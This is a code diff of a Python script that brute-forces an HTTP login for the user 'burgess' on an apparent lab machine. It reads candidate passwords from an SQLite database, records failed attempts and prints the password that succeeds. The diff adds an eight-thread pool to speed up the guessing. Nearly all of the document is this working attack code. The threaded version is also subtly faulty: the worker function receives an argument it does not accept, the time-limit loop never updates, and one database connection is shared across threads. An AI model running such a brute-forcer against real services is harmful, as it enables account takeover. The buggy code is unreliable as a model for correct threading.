@@ -7,6 +7,8 @@ So, I made a script, as seen here, which keeps track of attempted creds.
 A wise coder would introduce threading, but I did not.
 """
 
+# concurrent.futures for threading
+import concurrent.futures
 # requests for http requests
 import requests
 # sqlite3 for sqlite interaction
@@ -21,22 +23,12 @@ machine_ip = '10.10.189.97'
 conn = sqlite3.connect('http_creds.db')
 cur = conn.cursor()
 
-# I like to keep track of the count of creds not yet tried
-result = cur.execute('SELECT COUNT(*) FROM creds WHERE TRIED= 0')
-# results are returned as a tuple, the [0] gets the part I want
-count = result.fetchone()[0]
-# Print the count
-print("Count is {}".format(str(count)))
-
 # get the time now
 start_time = time.time()
-# establish running time
-running_time = time.time() - start_time
 
-# run for an hour (3600 seconds)
-while running_time < 3600:
+
+def test_creds():
     r = ''
-    running_time = time.time() - start_time
     result = cur.execute('SELECT COUNT(*) FROM creds WHERE TRIED= 0')
     count = result.fetchone()[0]
     print("{} to go".format(str(count)))
@@ -76,7 +68,7 @@ while running_time < 3600:
         username = "burgess"
         password = result.fetchone()[1]
         print("password: {}".format(password))
-        message = "username=burgess&password={}".format(password)
+        message = "username={}&password={}".format(username, password)
         headers = {
             "Host": machine_ip,
             "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
@@ -102,8 +94,8 @@ while running_time < 3600:
             skip = True
         if skip is False:
             if "Incorrect username or password." in r.text:
-                update = cur.execute('UPDATE creds SET TRIED = 1 WHERE username = ? AND password = ?',
-                                     ("burgess", password))
+                cur.execute('UPDATE creds SET TRIED = 1 WHERE username = ? AND password = ?',
+                            ("burgess", password))
                 conn.commit()
             else:
                 print("This one: {}".format(password))
@@ -111,3 +103,12 @@ while running_time < 3600:
             pass
     else:
         pass
+    return 0
+
+
+def main():
+    # establish running time
+    running_time = time.time() - start_time
+    while running_time < 3600:
+        with concurrent.futures.ThreadPoolExecutor(max_workers=8) as executor:
+            executor.map(test_creds, range(8))
